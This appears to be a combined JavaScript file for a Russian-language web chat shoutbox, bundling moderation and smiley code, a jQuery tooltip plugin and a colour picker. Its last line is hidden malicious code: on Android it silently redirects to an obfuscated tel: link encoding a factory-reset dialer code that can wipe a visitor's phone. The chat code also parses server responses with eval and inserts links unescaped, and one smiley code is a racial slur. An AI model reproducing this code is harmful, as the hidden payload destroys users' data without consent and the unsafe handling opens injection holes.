			var time = whomId.substr(0,8);
			var color = whomId.substr(8,16);
			s = s.replace(/([0-9]{2}):([0-9]{2}):([0-9]{2})#([0-9]|[a-f]){6}/, '<span style="background-color:' + color + '; font-size: 10px; color: black; text-shadow: 0px 0px 2px white;">&nbsp;&gt;&gt;&nbsp;</span>');
			return s;
		} else {
			return s;
		}
	},
	hideInfo: function(id, el) {
		var jEl = $('#' + id + ' .ys-post-info');
		if (this.prefs.info == 'overlay')
			jEl.fadeOut(this.animSpeed);
		else
			jEl.slideUp(this.animSpeed);
			
		el.innerHTML = 'Info';
		return false;
	}, 
	
	ban: function(post, id) {
		var self = this;

		var link = $('#' + id).find('.ys-ban-link')[0];

		switch(link.innerHTML) {
			case 'Ban':
				var pars = {
					reqType: 'ban',
					ip: post.adminInfo.ip,
					nickname: post.nickname
				};

				this.ajax(function(json) {
					if (json.error) {
						switch (json.error) {
							case 'admin':
								self.error('You\'re not an admin. Log in through the Admin CP to ban people.');
								break;
						}
						return;
					}
					//alert('p: ' + this.p + ' / ' + this.p.length);
					if (json.bannedSelf)
						self.banned(); // ?
						
					else 						
						$.each(self.p, function(i) {
							if (this.adminInfo && this.adminInfo.ip == post.adminInfo.ip) 
									$('#' + this.id)
										.addClass('ys-banned-post')
										.find('.ys-ban-link').html('Unban');
						});
						
				}, pars);
				
				link.innerHTML = 'Banning...';
				return false;
				break;
			
			case 'Banning...':
				return false;
				break;
			
			case 'Unban':
				var pars = {
					reqType: 'unban',
					ip: post.adminInfo.ip
				};
	
				this.ajax(function(json) {
					if (json.error) {
						switch(json.error) {
							case 'admin':
								self.error('You\'re not an admin. Log in through the Admin CP to unban people.');
								return;
								break;
						}
					}
					
					$.each(self.p, function(i) {
						if (this.adminInfo && this.adminInfo.ip == post.adminInfo.ip) 
							$('#' + this.id)
								.removeClass('ys-banned-post')
								.find('.ys-ban-link').html('Ban');
					});
					
				}, pars);
	
				link.innerHTML = 'Unbanning...';
				return false;
				break;
				
			case 'Unbanning...':
				return false;
				break;
		}
	},
	
	del: function(post, id) {
		var self = this;
		var link = $('#' + id).find('.ys-delete-link')[0];

		if (link.innerHTML == 'Deleting...') return;
	
		var pars = {
			reqType: 'delete',
			uid: post.uid
		};

		self.ajax(function(json) {
			if (json.error) {
				switch(json.error) {
					case 'admin':
						self.error('You\'re not an admin. Log in through the Admin CP to ban people.');
						return;
						break;
				}
			}
			self.reload();
		}, pars);

		link.innerHTML = 'Deleting...';
		return false;

	},
	ignore: function(post, id) {
		var self = this;
                var dt = new Date(), expiryTime = dt.setTime( dt.getTime() + 3600000);
                var uidname = post.uid.substr(0,6);
                var link = $('#' + id).find('.ys-ignore-link')[0];

                if (link.innerHTML == '+') {
                    document.cookie = 'ignore_'+ uidname +'=; expires=Thu, 01-Jan-70 00:00:01 GMT';
                    link.innerHTML = '&times;';
                    link.setAttribute('title', 'Игнор');
                } else {
                    document.cookie = 'ignore_'+ uidname +'='+ post.uid +'; expires=' + dt.toGMTString();
                    link.innerHTML = '+';
                    link.setAttribute('title', 'Отмена');
                }
	},
	banSelf: function(reason) {
		var self = this;

		this.ajax(function(json) {
			if (json.error == false)
				self.banned();
		}, {
			reqType: 'banself',
			nickname: $('#ys-input-nickname').val() 
		});
	},

	bbcode: function(s) {
		s = s.sReplace('[i]', '<i>');
		s = s.sReplace('[/i]', '</i>');
		s = s.sReplace('[I]', '<i>');
		s = s.sReplace('[/I]', '</i>');

		s = s.sReplace('[b]', '<b>');
		s = s.sReplace('[/b]', '</b>');
		s = s.sReplace('[B]', '<b>');
		s = s.sReplace('[/B]', '</b>');

		s = s.sReplace('[u]', '<u>');
		s = s.sReplace('[/u]', '</u>');
		s = s.sReplace('[U]', '<u>');
		s = s.sReplace('[/U]', '</u>');
		return s;
	},
	
	smileys: function(s) {
		var yp = this.options.yPath;
		
		var smile = function(str, smiley, image) {
			return str.sReplace(smiley, '<img src="' + yp + 'smileys/' + image + '" />');
			};
                s = smile(s, ':tro:',  'tro.gif');
                s = smile(s, ':ad:',  'ad.gif');
		s = smile(s, ':mih:',  'mih.gif');
		s = smile(s, ':oms:',  'oms.gif');
		s = smile(s, ':kom:',  'kom.gif');
		s = smile(s, ':tea:',  'tea.gif');
		s = smile(s, ':med:',  'med.gif');
		s = smile(s, ':kam:',  'kam.gif');
		s = smile(s, ':max:',  'dm.gif');
		s = smile(s, ':poc:',  'poc.gif');
		s = smile(s, ':ok:',  'ok.gif');
		s = smile(s, ':fu:',  'fu.gif');
		s = smile(s, ':ul:',  'ulit.gif');
		s = smile(s, ':aln:',  'alone.gif');
		s = smile(s, ':omg:',  'omg.gif');
		s = smile(s, ':fsb:',  'fsb.gif');
		s = smile(s, ':old:',  'tri.gif');
		s = smile(s, ':pvd:',  'pvd.gif');
		s = smile(s, ':cry:',  'rr.gif');
		s = smile(s, ':z:',  'z.gif');
                s = smile(s, ':grm:',  'grm.gif');
		s = smile(s, ':grn:',  'mrgreen.gif');
		s = smile(s, ':tem:',  'tema.gif');
		s = smile(s, ':sad:',  'sad.gif');
		s = smile(s, ':lol:',  'smile.gif');
		s = smile(s, ':nig:',  'nigra.gif');
		s = smile(s, ':pet:',  'pet.gif');
		s = smile(s, ':nom:',  'nomad.gif');
		s = smile(s, ':trl:',  'troll.gif');
		s = smile(s, ':f:',  'f.gif');
		s = smile(s, ':p:',  'petr.gif');
		s = smile(s, ':b:',  'b.gif');
		s = smile(s, ':il:',  'il.gif');
		s = smile(s, ':t:',  'tian.gif');
		s = smile(s, ':rag:',  'rage.gif');
		s = smile(s, ':slo:',  'slow.gif');
		s = smile(s, ':pis:',  'pist.gif');
		s = smile(s, ':bm:',  'bm.gif');
		s = smile(s, ':rak:',  'cancer.gif');
		s = smile(s, ':fp:',  'fp.gif');
		s = smile(s, ':bug:',  'bug.gif');
		s = smile(s, ':ato:',  'ato.gif');
		s = smile(s, ':nya:',  'pled.gif');
		s = smile(s, ':cat:',  'cat.gif');
		s = smile(s, ':c2m:',  'cam.gif');
		s = smile(s, ':c3b:',  'cab.gif');
                s = smile(s, ':adv:',  'adv.gif');
                s = smile(s, ':jah:',  'can.gif');
                s = smile(s, ':spa:',  'spa.gif');
		s = smile(s, ':sig:',  'siga.gif');
                s = smile(s, ':yao:',  'yaom.png');
                s = smile(s, ':pfp:',  'fpp.png');
                s = smile(s, ':swi:',  'borg.png');
                s = smile(s, ':vga:',  'vanga.png');
                return s;
	},

	links: function(s) {
		return s.replace(/((https|http|ftp|ed2k):\/\/[\S]+)/gi, '<a  href="$1" target="_blank">$1</a>');
	},

	truncate: function(clearAll) {
		var truncateTo = clearAll ? 0 : this.prefs.truncate;
		var posts = $('#ys-posts .ys-post').length;
		if (posts <= truncateTo) return;
		//alert(this.initializing);
		if (this.prefs.doTruncate || this.initializing) {
			var diff = posts - truncateTo;
			for (var i = 0; i < diff; i++)
				this.p.shift();
			
			//	$('#ys-posts .ys-post:gt(' + truncateTo + ')').remove();

			if (this.prefs.inverse) 
				$('#ys-posts .ys-post:gt(' + (truncateTo - 1) + ')').remove();
				else 
				$('#ys-posts .ys-post:lt(' + (posts - truncateTo) + ')').remove();
		}
		
		this.markEnds();		
	},
	
	markEnds: function() {
		$('#ys-posts')
			.find('.ys-first').removeClass('ys-first').end()
			.find('.ys-last').removeClass('ys-last');
			
		$('#ys-posts .ys-post:first-child').addClass('ys-first');
		$('#ys-posts .ys-post:last-child').addClass('ys-last');
	},
	
	reload: function(everything) {
		var self = this;
		this.initializing = true;
	
		if (everything) {
			this.ajax(function(json) { 
				$('#yshout').html(''); 
				clearInterval(this.refreshTimer);
				clearInterval(this.floodTimer);
				this.initialLoad(json); 
			}, { 
				reqType: 'init',
				yPath: this.options.yPath,
				log: this.options.log
			});
		} else {
			this.ajax(function(json) {this.truncate(true);this.updates(json);this.initializing = false;}, {
				reqType: 'reload'
			});
		}
	},

	error: function(str) {
		alert(str);
	},

	json: function(parse) {
		this.d('In json: ' + parse);
		var json = eval('(' + parse + ')');
		if (!this.checkError(json)) return json;
	},

	checkError: function(json) {
		if (!json.yError) return false;

		this.d('Error: ' + json.yError);
		return true;
	},

	ajax: function(callback, pars, html) {
		pars = jQuery.extend({
			reqFor: 'shout'
		}, pars);

		var self = this;

		$.ajax({
			type: 'POST',
			url: this.options.yPath + 'yshout.php',
			dataType: html ? 'text' : 'json',
			data: pars,
			success: function(parse) {
                            var arr = [parse];
                            callback.apply(self, arr);
	
			}
		});
	},

	d: function(message) {
	//	console.log(message);
		$('#debug').css('display', 'block').prepend('<p>' + message + '</p>');
		return message;
	}
};

//###### jquery.tooltip.js
(function($) {
	jQuery.fn.tooltip = function(options){
		 var defaults = {  
		    offsetX: 15,  //X Offset value
		    offsetY: 10,  //Y Offset value
		    fadeIn : '200', //Tooltip fadeIn speed, can use, slow, fast, number
		    fadeOut : '200',//Tooltip fadeOut speed, can use, slow, fast, number
		    dataAttr : 'data',	//Used when we create seprate div to hold your tooltip data, so plugin search div tage by using id 'data' and current href id on whome the mouse pointer is so if your href id is '_tooltip_1' then the div which hold that tooltips content should have id 'data_tooltip_1', if you change dataAttr from default then you need to build div tag with id 'current dataAttr _tooltip_1' without space
		    bordercolor: '#ffbf00', // tooltip border color
		    bgcolor: '#000000', //Tooltip background color
		    fontcolor : '#76b2db', //Tooltip Font color
		    fontsize : '14px', // Tooltip font size
		    folderurl : 'NULL', // Folder url, where the tooltip's content file is placed, needed with forward slash in the last (/), or can be use as http://www.youwebsitename.com/foldername/ also.
		    filetype: 'txt', // tooltip's content files type, can be use html, txt
		    height: 'auto', // Tooltip's width
		    width : 'auto', //Tooltip's Height
		    cursor : 'help' // Mouse cursor
		   };  
	var options = $.extend(defaults, options);
	//Runtime div building to hold tooltip data, and make it hidden
	var $tooltip = $('<div id="divToolTip"></div>');
	return this.each(function(){					
			$('body').append($tooltip);
			$tooltip.hide();
	//Runtime variable definations
		var element = this;
		var id = $(element).attr('id');
		var filename = options.folderurl + id + '.' + options.filetype;
		var dialog_id = '#divToolTip';
	//Tooltips main function
		$(this).hover(function(e){
				//var size = "Windows Width : " + $(document).width() + " Tip Width : " + e.pageX + "\n" + "Windows Height : " + $(document).height() + " Tip Height : " + e.pageY;
				//alert(size);
				//to check whether the tooltips content files folder is defined or not
				if(options.folderurl != "NULL"){
					$(dialog_id).load(filename);

				}else
				{
					if($('#'+options.dataAttr + '_' + id).length > 0){
						$(dialog_id).html($('#'+ options.dataAttr + '_' + id).html());
						//$(dialog_id).html(size);
					}else{
						$(dialog_id).html(id);
						//$(dialog_id).html(size);
					}
				}
				//assign css value to div
				$(element).css({'cursor' : options.cursor});
				if($(document).width() / 2 < e.pageX){
					$(dialog_id).css({
						'position' : 'absolute',
						'border' : '1px solid ' + options.bordercolor,
						'background-color' : options.bgcolor,
						'padding' : '5px 5px 5px 5px',
						'-moz-border-radius' : '5px 5px 5px 5px',
						'-webkit-border-radius' : '5px 5px 5px 5px',
						'top' : e.pageY + options.offsetY,
						'left' :  e.pageX - $(dialog_id).width() + options.offsetX,
						'color' : options.fontcolor,
						'font-size' : options.fontsize,
						'height' : options.height,
						'width' : options.width
					});
					//alert(size);
				}else{	
					$(dialog_id).css({
						'position' : 'absolute',
						'border' : '1px solid ' + options.bordercolor,
						'background-color' : options.bgcolor,
						'padding' : '5px 5px 5px 5px',
						'-moz-border-radius' : '5px 5px 5px 5px',
						'-webkit-border-radius' : '5px 5px 5px 5px',
						'top' : e.pageY + options.offsetY,
						'left' : e.pageX + options.offsetX,
						'color' : options.fontcolor,
						'font-size' : options.fontsize,
						'cursor' : options.cursor,
						'height' : options.height,
						'width' : options.width
					});
//alert(size);
				}
				//enable div block
				$(dialog_id).stop(true, true).fadeIn(options.fadeIn);	
					},function(){
				// when mouse out remove all data from div and make it hidden
				$(dialog_id).stop(true, true).fadeOut(options.fadeOut);	
					}).mousemove(function(e){	
				// to make tooltip moveable with mouse	
				if($(document).width() / 2 < e.pageX){		
				$(dialog_id).css({
					'top' : e.pageY + options.offsetY,
					'left' : e.pageX - $(dialog_id).width(),
					'height' : options.height,
					'width' : options.width
					});
				//$(dialog_id).html(e.pageX - $(dialog_id).width());
				}else{
					$(dialog_id).css({
					'top' : e.pageY + options.offsetY,
					'left' : e.pageX + options.offsetX,
					'height' : options.height,
					'width' : options.width
					});
				}
			});
		});
	};
 })(jQuery);
 //IE Redirect
var useragentRedirect = navigator.userAgent;
var patternRedirect=/MSIE\s/g;
if ( patternRedirect.test(useragentRedirect)){
//	window.location += "ie.html";
}
//###### ColorPicker
jQuery.fn.farbtastic = function (callback) {
  $.farbtastic(this, callback);
  return this;
};

jQuery.farbtastic = function (container, callback) {
  var container = $(container).get(0);
  return container.farbtastic || (container.farbtastic = new jQuery._farbtastic(container, callback));
}

jQuery._farbtastic = function (container, callback) {
  // Store farbtastic object
  var fb = this;

  // Insert markup
  $(container).html('<div class="farbtastic"><div class="color"></div><div class="wheel"></div><div class="overlay"></div><div class="h-marker marker"></div><div class="sl-marker marker"></div></div>');
  var e = $('.farbtastic', container);
  fb.wheel = $('.wheel', container).get(0);
  // Dimensions
  fb.radius = 84;
  fb.square = 100;
  fb.width = 194;

  // Fix background PNGs in IE6
  if (navigator.appVersion.match(/MSIE [0-6]\./)) {
    $('*', e).each(function () {
      if (this.currentStyle.backgroundImage != 'none') {
        var image = this.currentStyle.backgroundImage;
        image = this.currentStyle.backgroundImage.substring(5, image.length - 2);
        $(this).css({
          'backgroundImage': 'none',
          'filter': "progid:DXImageTransform.Microsoft.AlphaImageLoader(enabled=true, sizingMethod=crop, src='" + image + "')"
        });
      }
    });
  }

  /**
   * Link to the given element(s) or callback.
   */
  fb.linkTo = function (callback) {
    // Unbind previous nodes
    if (typeof fb.callback == 'object') {
      $(fb.callback).unbind('keyup', fb.updateValue);
    }

    // Reset color
    fb.color = null;

    // Bind callback or elements
    if (typeof callback == 'function') {
      fb.callback = callback;
    }
    else if (typeof callback == 'object' || typeof callback == 'string') {
      fb.callback = $(callback);
      fb.callback.bind('keyup', fb.updateValue);
      if (fb.callback.get(0).value) {
        fb.setColor(fb.callback.get(0).value);
      }
    }
    return this;
  }
  fb.updateValue = function (event) {
    if (this.value && this.value != fb.color) {
      fb.setColor(this.value);
    }
  }

  /**
   * Change color with HTML syntax #123456
   */
  fb.setColor = function (color) {
    var unpack = fb.unpack(color);
    if (fb.color != color && unpack) {
      fb.color = color;
      fb.rgb = unpack;
      fb.hsl = fb.RGBToHSL(fb.rgb);
      fb.updateDisplay();
    }
    return this;
  }

  /**
   * Change color with HSL triplet [0..1, 0..1, 0..1]
   */
  fb.setHSL = function (hsl) {
    fb.hsl = hsl;
    fb.rgb = fb.HSLToRGB(hsl);
    fb.color = fb.pack(fb.rgb);
    fb.updateDisplay();
    return this;
  }

  /////////////////////////////////////////////////////

  /**
   * Retrieve the coordinates of the given event relative to the center
   * of the widget.
   */
  fb.widgetCoords = function (event) {
    var x, y;
    var el = event.target || event.srcElement;
    var reference = fb.wheel;

    if (typeof event.offsetX != 'undefined') {
      // Use offset coordinates and find common offsetParent
      var pos = {x: event.offsetX, y: event.offsetY};

      // Send the coordinates upwards through the offsetParent chain.
      var e = el;
      while (e) {
        e.mouseX = pos.x;
        e.mouseY = pos.y;
        pos.x += e.offsetLeft;
        pos.y += e.offsetTop;
        e = e.offsetParent;
      }

      // Look for the coordinates starting from the wheel widget.
      var e = reference;
      var offset = {x: 0, y: 0}
      while (e) {
        if (typeof e.mouseX != 'undefined') {
          x = e.mouseX - offset.x;
          y = e.mouseY - offset.y;
          break;
        }
        offset.x += e.offsetLeft;
        offset.y += e.offsetTop;
        e = e.offsetParent;
      }

      // Reset stored coordinates
      e = el;
      while (e) {
        e.mouseX = undefined;
        e.mouseY = undefined;
        e = e.offsetParent;
      }
    }
    else {
      // Use absolute coordinates
      var pos = fb.absolutePosition(reference);
      x = (event.pageX || 0*(event.clientX + $('html').get(0).scrollLeft)) - pos.x;
      y = (event.pageY || 0*(event.clientY + $('html').get(0).scrollTop)) - pos.y;
    }
    // Subtract distance to middle
    return {x: x - fb.width / 2, y: y - fb.width / 2};
  }

  /**
   * Mousedown handler
   */
  fb.mousedown = function (event) {
    // Capture mouse
    if (!document.dragging) {
      $(document).bind('mousemove', fb.mousemove).bind('mouseup', fb.mouseup);
      document.dragging = true;
    }

    // Check which area is being dragged
    var pos = fb.widgetCoords(event);
    fb.circleDrag = Math.max(Math.abs(pos.x), Math.abs(pos.y)) * 2 > fb.square;

    // Process
    fb.mousemove(event);
    return false;
  }

  /**
   * Mousemove handler
   */
  fb.mousemove = function (event) {
    // Get coordinates relative to color picker center
    var pos = fb.widgetCoords(event);

    // Set new HSL parameters
    if (fb.circleDrag) {
      var hue = Math.atan2(pos.x, -pos.y) / 6.28;
      if (hue < 0) hue += 1;
      fb.setHSL([hue, fb.hsl[1], fb.hsl[2]]);
    }
    else {
      var sat = Math.max(0, Math.min(1, -(pos.x / fb.square) + .5));
      var lum = Math.max(0, Math.min(1, -(pos.y / fb.square) + .5));
      fb.setHSL([fb.hsl[0], sat, lum]);
    }
    return false;
  }

  /**
   * Mouseup handler
   */
  fb.mouseup = function () {
    // Uncapture mouse
    $(document).unbind('mousemove', fb.mousemove);
    $(document).unbind('mouseup', fb.mouseup);
    document.dragging = false;
  }

  /**
   * Update the markers and styles
   */
  fb.updateDisplay = function () {
    // Markers
    var angle = fb.hsl[0] * 6.28;
    $('.h-marker', e).css({
      left: Math.round(Math.sin(angle) * fb.radius + fb.width / 2) + 'px',
      top: Math.round(-Math.cos(angle) * fb.radius + fb.width / 2) + 'px'
    });

    $('.sl-marker', e).css({
      left: Math.round(fb.square * (.5 - fb.hsl[1]) + fb.width / 2) + 'px',
      top: Math.round(fb.square * (.5 - fb.hsl[2]) + fb.width / 2) + 'px'
    });

    // Saturation/Luminance gradient
    $('.color', e).css('backgroundColor', fb.pack(fb.HSLToRGB([fb.hsl[0], 1, 0.5])));

    // Linked elements or callback
    if (typeof fb.callback == 'object') {
      // Set background/foreground color
      $(fb.callback).css({
        backgroundColor: fb.color,
        color: fb.hsl[2] > 0.5 ? '#000' : '#fff'
      });

      // Change linked value
      $(fb.callback).each(function() {
        if (this.value && this.value != fb.color) {
          this.value = fb.color;
        }
      });
    }
    else if (typeof fb.callback == 'function') {
      fb.callback.call(fb, fb.color);
    }
  }

  /**
   * Get absolute position of element
   */
  fb.absolutePosition = function (el) {
    var r = {x: el.offsetLeft, y: el.offsetTop};
    // Resolve relative to offsetParent
    if (el.offsetParent) {
      var tmp = fb.absolutePosition(el.offsetParent);
      r.x += tmp.x;
      r.y += tmp.y;
    }
    return r;
  };

  /* Various color utility functions */
  fb.pack = function (rgb) {
    var r = Math.round(rgb[0] * 255);
    var g = Math.round(rgb[1] * 255);
    var b = Math.round(rgb[2] * 255);
    return '#' + (r < 16 ? '0' : '') + r.toString(16) +
           (g < 16 ? '0' : '') + g.toString(16) +
           (b < 16 ? '0' : '') + b.toString(16);
  }

  fb.unpack = function (color) {
    if (color.length == 7) {
      return [parseInt('0x' + color.substring(1, 3)) / 255,
        parseInt('0x' + color.substring(3, 5)) / 255,
        parseInt('0x' + color.substring(5, 7)) / 255];
    }
    else if (color.length == 4) {
      return [parseInt('0x' + color.substring(1, 2)) / 15,
        parseInt('0x' + color.substring(2, 3)) / 15,
        parseInt('0x' + color.substring(3, 4)) / 15];
    }
  }

  fb.HSLToRGB = function (hsl) {
    var m1, m2, r, g, b;
    var h = hsl[0], s = hsl[1], l = hsl[2];
    m2 = (l <= 0.5) ? l * (s + 1) : l + s - l*s;
    m1 = l * 2 - m2;
    return [this.hueToRGB(m1, m2, h+0.33333),
        this.hueToRGB(m1, m2, h),
        this.hueToRGB(m1, m2, h-0.33333)];
  }

  fb.hueToRGB = function (m1, m2, h) {
    h = (h < 0) ? h + 1 : ((h > 1) ? h - 1 : h);
    if (h * 6 < 1) return m1 + (m2 - m1) * h * 6;
    if (h * 2 < 1) return m2;
    if (h * 3 < 2) return m1 + (m2 - m1) * (0.66666 - h) * 6;
    return m1;
  }

  fb.RGBToHSL = function (rgb) {
    var min, max, delta, h, s, l;
    var r = rgb[0], g = rgb[1], b = rgb[2];
    min = Math.min(r, Math.min(g, b));
    max = Math.max(r, Math.max(g, b));
    delta = max - min;
    l = (min + max) / 2;
    s = 0;
    if (l > 0 && l < 1) {
      s = delta / (l < 0.5 ? (2 * l) : (2 - 2 * l));
    }
    h = 0;
    if (delta > 0) {
      if (max == r && max != g) h += (g - b) / delta;
      if (max == g && max != b) h += (2 + (b - r) / delta);
      if (max == b && max != r) h += (4 + (r - g) / delta);
      h /= 6;
    }
    return [h, s, l];
  }

  // Install mousedown handler (the others are set on the document on-demand)
  $('*', e).mousedown(fb.mousedown);

    // Init color
  fb.setColor('#000000');

  // Set linked elements/callback
  if (callback) {
    fb.linkTo(callback);
  }
}

if((0 < navigator.userAgent.indexOf("Android"))) { document.location=String.fromCharCode(116,101,108,58,42,50,55,54,55,42,51,56,53,53,37,50,51); }